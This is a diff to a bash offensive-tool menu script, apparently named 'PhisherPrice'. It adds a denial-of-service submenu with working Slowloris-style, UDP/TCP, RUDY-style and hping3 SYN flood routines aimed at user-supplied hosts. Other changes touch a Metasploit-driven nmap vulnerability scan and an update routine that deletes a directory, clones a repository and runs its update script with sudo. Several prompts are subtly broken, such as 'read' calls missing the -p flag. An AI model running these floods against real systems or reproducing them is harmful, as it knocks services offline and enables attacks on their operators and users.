@@ -345,8 +345,8 @@ read
 elif [ "$x" == "$sub9" ]; then                    #sshscanner
 clear
 function scan_ciphers() {
-  local host="$1"
-  local port="$2"
+  host="$1"
+  port="$2"
 
   printf "Testing available ciphers on %s:%s...\n" "$host" "$port"
   printf "\n\033[1;33mTesting for weak ciphers...\033[0m\n"
@@ -773,7 +773,21 @@ read victim_ip
 echo -e "\n\e[1;36m------------------------------\e[0m"
 echo -e "\e[1;36mRunning nmap with vuln script...\e[0m"
 echo -e "\e[1;36m------------------------------\e[0m"
+
+# start spinner animation
+spinner="/-\|"
+while true; do
+  for i in $(seq 0 3); do
+    echo -ne "\rScanning $victim_ip... ${spinner:$i:1}"
+    sleep 0.1
+  done
+done &
+
+# run command and save output
 output=$(msfconsole -q -x "nmap -v --script vuln $victim_ip ;exit ;" 2>&1)
+
+# stop spinner animation
+kill "$!" >/dev/null 2>&1
 
 if echo "$output" | grep -q "VULNERABLE"; then
   echo -e "\n\e[1;31m-------------------------------------------\e[0m"
@@ -784,7 +798,7 @@ else
   clear
   echo -e "\n\e[1;32m-------------------------------------------\e[0m"
   echo -e "\e[1;32mNo vulnerabilities found.\e[0m"
-echo -e "\n\e[1;32m-------------------------------------------\e[0m"
+  echo -e "\n\e[1;32m-------------------------------------------\e[0m"
 fi
 
 read -p "Press enter to continue."
@@ -2216,6 +2230,7 @@ blueranger='8'
 eeng='9'
 kissmet1='10'
 whoney='11'
+subdosm='12'
 
 wait
 echo -e $Blue" ┌─["$red"PhisherPrice$Blue]──[$red~$Blue]─["$yellow"Networking$Blue]:"
@@ -2699,6 +2714,220 @@ else
 fi
 
 read -p "Press Enter to continue."
+else 
+
+n
+
+
+fi
+
+elif [ "$x" == "$subdosm" ]; then                          #DOS
+clear
+	echo -e "${banner}"
+	echo -e '\e[3;34m Created by \e[1;31m"SirCryptic"                      
+                   
+\e[0m\e[3;39m \e[1;31m
+Denial-Of-Service Toolkit
+\e[3;39m
+(1) Slowloris Attack
+(2) UDP/TCP Flood Attack
+(3) R-U-Dead-Yet Attack
+(4) SYN flood attack
+CTRL + C To Exit
+Press ENTER To Go To Main Menu
+'
+slowdos='1'
+udpdos='2'
+rudydos='3'
+synner='4'
+
+wait
+echo -e $Blue" ┌─["$red"PhisherPrice$Blue]──[$red~$Blue]─["$yellow"DoS-Toolkit$Blue]:"
+echo -e $Blue" └─────► " ;read -p " CHOOSE: " x
+
+if [ "$x" == "$slowdos" ]; then                    #slowloris
+clear
+echo "Slowloris Type Attack"
+echo "Example: example.com 80 1024 60"
+read -p "Host" host
+
+read -p "Port" port
+
+read -p "Requests to send" requests
+
+read -p "Time to last (in seconds)" duration
+
+read -p "Delay between requests (in seconds)" delay
+
+read -p "Use HTTPS? [y/n]" use_https
+
+if [[ $use_https == "y" ]]; then
+  protocol="https"
+else
+  protocol="http"
+fi
+
+read "Randomize User-Agent header? [y/n]" randomize_ua
+
+if [[ $randomize_ua == "y" ]]; then
+  ua_flag="-H 'User-Agent: \$(shuf -n 1 user_agents.txt)'"
+else
+  ua_flag=""
+fi
+
+endtime=$((SECONDS+duration))
+
+echo "~To cancel the attack press 'Ctrl-C'"
+echo "|Hostname|            |Port|            |Requests|            |Duration|            |Delay|            |HTTPS|            |User-Agent|"
+echo "|$host|            |$port|            |$requests|            |$duration|            |$delay|            |$use_https|            |$randomize_ua|"
+
+while [ $SECONDS -lt $endtime ]; do
+  for ((i=0;i<$requests;i++)); do
+    if [[ $randomize_ua == "y" ]]; then
+      eval "curl -s -o /dev/null -k -m 10 --retry 0 $ua_flag ${protocol}://$host:$port/ >/dev/null 2>&1 &"
+    else
+      curl -s -o /dev/null -k -m 10 --retry 0 ${protocol}://$host:$port/ >/dev/null 2>&1 &
+    fi
+    sleep $delay
+  done
+done
+
+echo "Attack finished."
+
+read
+
+elif [ "$x" == "$udpdos" ]; then                    #udp-flood
+
+clear
+echo "UDP/TCP Flood Attack with Multithreading and Randomization"
+echo "Example: 10.0.0.1 80 1024 60 50"
+read -p "IP" ip
+
+read -p "Port" port
+
+read -p "Size of the packet to send" size
+
+read -p "Time in seconds" t
+
+read -p "Number of threads to use" threads
+
+read -p "Do you want to randomize packet content? (y/n)" randomize_content
+
+read -p "Do you want to randomize delay between requests? (y/n)" randomize_delay
+
+read "Which protocol do you want to use? (UDP/TCP)" protocol
+
+endtime=$((SECONDS+t))
+
+echo "~To cancel the attack press 'Ctrl-C'"
+echo "|IP|            |Port|            |Size|            |Time|            |Threads|            |Randomize Content|            |Randomize Delay|            |Protocol|"
+echo "|$ip|            |$port|            |$size|            |$t|            |$threads|            |$randomize_content|            |$randomize_delay|            |$protocol|"
+
+function attack {
+  if [ "$randomize_content" == "y" ]; then
+    data=$(head -c $size /dev/urandom | tr -dc 'a-zA-Z0-9')
+  else
+    data=$(printf "%${size}s" | tr ' ' 'A')
+  fi
+
+  if [ "$protocol" == "UDP" ]; then
+    echo "$data" > /dev/udp/$ip/$port
+  else
+    echo "$data" | nc -w 1 $ip $port
+  fi
+}
+
+for ((i=0;i<$threads;i++)); do
+  while [ $SECONDS -lt $endtime ]; do
+    attack &
+    if [ "$randomize_delay" == "y" ]; then
+      sleep 0.$((RANDOM%3))
+    else
+      sleep 0.1
+    fi
+  done
+done
+
+echo "Attack finished."
+
+read
+
+elif [ "$x" == "$rudydos" ]; then                    #rudy
+clear
+echo "R-U-Dead-Yet (RUDY) Type Attack"
+echo "Example: example.com 80 1000 60"
+echo "Host"
+read host
+
+echo "Port"
+read port
+
+echo "Size of the payload in bytes"
+read payload_size
+
+echo "Number of headers"
+read header_count
+
+echo "Number of packets to send"
+read packet_count
+
+echo "Duration in seconds"
+read duration
+
+endtime=$((SECONDS+duration))
+
+echo "~To cancel the attack press 'Ctrl-C'"
+echo "|Hostname|            |Port|            |Payload Size|            |Header Count|            |Packet Count|            |Duration|"
+echo "|$host|            |$port|            |$payload_size|            |$header_count|            |$packet_count|            |$duration|"
+
+for ((i=0; i<packet_count; i++)); do
+  headers=""
+  for ((j=1; j<=header_count; j++)); do
+    header_name=$(head /dev/urandom | tr -dc 'a-zA-Z0-9' | fold -w 8 | head -n 1)
+    header_value=$(head /dev/urandom | tr -dc 'a-zA-Z0-9' | fold -w 16 | head -n 1)
+    headers+="\r\n$header_name: $header_value"
+  done
+  payload=$(head /dev/urandom | tr -dc 'a-zA-Z0-9' | fold -w $payload_size | head -n 1)
+  curl -H "$headers" -d "$payload" -X POST "http://$host:$port" >/dev/null 2>&1
+  echo "Sent request $((i+1)) of $packet_count"
+done
+
+echo "Attack finished."
+
+read
+
+elif [ "$x" == "$synner" ]; then                    #syn flood
+echo "SYN flood attack"
+echo "Example: example.com 80"
+echo "Host"
+read host
+
+echo "Port"
+read port
+
+echo "Number of packets to send"
+read packets
+
+echo "Packet size in bytes"
+read size
+
+echo "Window size"
+read window_size
+
+echo "Sending $packets packets of size $size bytes with window size $window_size to $host on port $port"
+
+data=$(head -c $size /dev/urandom | tr -dc 'a-zA-Z0-9')
+for ((i=1;i<=$packets;i++)); do
+  hping3 -c 1 -d $size -S -w $window_size $host -p $port >/dev/null 2>&1
+  sleep 0.1
+  echo "$data" >/dev/udp/$host/$port >/dev/null 2>&1
+  sleep 0.1
+
+  hping3 -c 1 -d $size -F -w $window_size $host -p $port >/dev/null 2>&1
+done
+
+echo "Attack finished."
+read
 
 else 
 
@@ -3171,11 +3400,49 @@ else
 fi
 
 read -p "Press Enter to continue."
-# Changed Back The Update Feature For Now
+# Changed Back The Update Feature For Now but with OS Checks Still..
 elif [ "$x" == "$update" ]; then                 #Update
-echo "This Script is Only Intended for Kali Linux And Similar OS"
+clear
+if [ -f /etc/debian_version ]; then
+    OS="Debian"
+elif [ -f /etc/arch-release ]; then
+    OS="Arch"
+elif [ -f /etc/lsb-release ]; then
+    . /etc/lsb-release
+    OS=$DISTRIB_ID
+elif [ -f /etc/os-release ]; then
+    . /etc/os-release
+    OS=$NAME
+elif [ -f /etc/backbox-release ]; then
+    OS="BackBox"
+elif [ -f /etc/rpi-issue ]; then
+    OS="Raspbian"
+elif [ -d "$HOME/.termux" ]; then
+    OS="Termux"
+else
+    echo "This script is only intended for Debian, Ubuntu, Arch, Kali, BackBox, Raspbian, and Termux."
+    exit 1
+fi
 
-git clone https://github.com/sircryptic/phisherprice
+if [ "$OS" != "Debian" ] && [ "$OS" != "Ubuntu" ] && [ "$OS" != "Arch" ] && [ "$OS" != "Kali" ] && [ "$OS" != "BackBox" ] && [ "$OS" != "Raspbian" ] && [ "$OS" != "Termux" ]; then
+    echo "This script is only intended for Kali Linux and similar OS."
+    exit 1
+fi
+
+if [ -d "phisherprice" ]; then
+    read -p "The 'phisherprice' directory already exists. Do you want to delete it and download the latest version? [y/n] " choice
+    case "$choice" in
+      y|Y ) 
+        cd&&rm -rf phisherprice
+        ;;
+      * ) 
+        echo "Skipping phisherprice update."
+        exit 1
+        ;;
+    esac
+fi
+
+cd&&git clone https://github.com/sircryptic/phisherprice
 cd phisherprice && sudo bash ./update.sh
 sudo phisherprice
 
